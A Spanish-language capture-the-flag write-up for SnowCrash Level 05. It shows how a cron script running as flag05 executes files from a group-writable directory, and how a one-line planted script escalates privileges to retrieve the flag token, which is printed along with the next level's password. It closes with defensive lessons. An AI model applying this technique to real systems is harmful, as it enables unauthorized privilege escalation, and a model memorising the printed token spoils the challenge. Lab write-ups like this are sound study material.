# SnowCrash - Level 05: Explotación de Tareas Programadas (Cron Jobs)

Este repositorio documenta el proceso de resolución del **Nivel 05** de SnowCrash. El reto consiste en identificar un script de automatización con permisos elevados y manipular su directorio de entrada para ejecutar comandos arbitrarios como otro usuario.

## 1. Análisis Inicial

Cuando iniciamos sesión como nivel 05, recibimos automáticamente el mensaje: "You have new mail".
Tras investigar un poco, encontramos el archivo "nivel 05" en "/var/mail/level05".
```
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:~$
```

Podemos ver que cada 2 minutos se ejecuta "/usr/sbin/openarenaserver".
```
level05@SnowCrash:~$ ls -la /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
level05@SnowCrash:~$
```
### Localización del Script

Al iniciar el nivel, buscamos archivos pertenecientes al usuario `flag05` o que tengan configuraciones inusuales. Encontramos un script en una ruta de binarios del sistema:

```bash
ls -la /usr/sbin/openarenaserver
# -rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver

```

**Observaciones clave:**

* **Propietario:** El script pertenece a `flag05`.
* **Atributos:** El símbolo `+` en los permisos indica la presencia de **ACLs** (Listas de Control de Acceso), sugiriendo que el script es parte de un proceso automatizado del sistema.

---

## 2. Análisis del Código Fuente

El contenido del script `/usr/sbin/openarenaserver` es el siguiente:

```bash
#!/bin/bash

for i in /opt/openarenaserver/* ; do
   (ulimit -t 5; bash -x "$i")
   rm -f "$i"
done

```

### Lógica del Script:

1. El script recorre mediante un bucle `for` todos los archivos contenidos en el directorio `/opt/openarenaserver/`.
2. Ejecuta cada archivo encontrado como un script de shell (`bash -x "$i"`).
3. Una vez ejecutado, elimina el archivo (`rm -f "$i"`).

### Vulnerabilidad Detectada:

El script ejecuta **cualquier** archivo presente en `/opt/openarenaserver/` con los privilegios del usuario que lanza el script (en este caso, `flag05` a través de un cron job). Si tenemos permisos de escritura en ese directorio, podemos inyectar nuestro propio código.

---

## 3. Metodología de Explotación

### Paso 1: Verificación de Permisos

Comprobamos si podemos escribir en el directorio de destino:

```bash
ls -ld /opt/openarenaserver
# drwxrwx---+ 2 root level05 40 Jan 5 18:15 /opt/openarenaserver

```

Confirmamos que el grupo `level05` tiene permisos de escritura en la carpeta.

### Paso 2: Creación del Payload

Creamos un script malicioso diseñado para ejecutar `getflag` y redirigir la salida a un archivo legible en `/tmp`:

```bash
echo "getflag > /tmp/token" > /opt/openarenaserver/break.sh

```

### Paso 3: Ejecución Automática

Dado que no podemos ejecutar el script principal manualmente como `flag05`, esperamos a que el sistema lo haga de forma automática (normalmente cada minuto mediante un Cron Job).

Sabemos que el exploit ha funcionado cuando el archivo desaparece del directorio:

```bash
ls /opt/openarenaserver/break.sh
# ls: cannot access /opt/openarenaserver/break.sh: No such file or directory

```

---

## 4. Resultado y Resolución

Una vez que el script automático ejecutó nuestro archivo `break.sh`, el token se generó en la ruta especificada:

```bash
cat /tmp/token

```

* **Token obtenido:** `viuaaale9huek52boumoomioc`

### Pasos finales:

1. Cambiar al usuario objetivo: `su level06`
2. Introducir la contraseña: `viuaaale9huek52boumoomioc`

**Level 05 passed!**

---

## 5. Conclusiones Técnicas

* **Abuso de Automatización:** Los scripts que ejecutan contenidos de directorios públicos/compartidos son vectores críticos de escalada de privilegios.
* **Principio de Menor Privilegio:** Un script de mantenimiento nunca debería ejecutar archivos creados por usuarios con menos privilegios sin una validación estricta.
* **Cron Jobs:** La monitorización de procesos en segundo plano es fundamental en las auditorías de sistemas Linux.

---
